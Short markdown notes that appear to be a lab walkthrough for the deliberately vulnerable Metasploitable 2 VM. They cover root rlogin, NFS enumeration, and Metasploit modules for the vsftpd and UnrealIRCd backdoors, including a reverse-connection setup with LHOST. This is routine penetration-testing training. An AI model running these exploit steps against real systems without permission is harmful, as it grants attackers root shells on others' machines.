# Metasploitable 2

# Unix Basics

## Rlogin (512,513,514)
- TCP ports 512, 513, and 514 are known as “r” services, and have been misconfigured to allow remote access from any host
- For this vulnerability we need rsh-client
    ```
    rlogin -l root ip_address
    ```

## Network File System(2049)
- Lets use rpcinfo to identify NFS
    ```
    rpcinfo -p ip_address
    ```
-  To determine that the ”/” share (the root of the file system) is being exported
    ```
    showmount -e ip_address
    ```

## Backdoor
- **On port 21, Metasploitable2 runs vsftpd, a popular FTP server**
- For this vsftpd go to msfconsole of linux
    ```
    msfconsole
    ```
- After that use following exploit
    ```
    use exploit/unix/ftp/vsftpd_234_backdoor
    ```

    ![Screenshot](/images/vsftp.png)


- **On port 6667, Metasploitable2 runs the UnreaIRCD IRC daemon**
    - For this use following exploit
        ```
        msfconsole
        ```

        ```
        use exploit/unix/irc/unreal_ircd_3281_backdoor
        ```

        ```
        set RHOSTS target_ip
        ```

        ```
        set LHOST attacker_ip
        ```

        ```
        exploit
        ```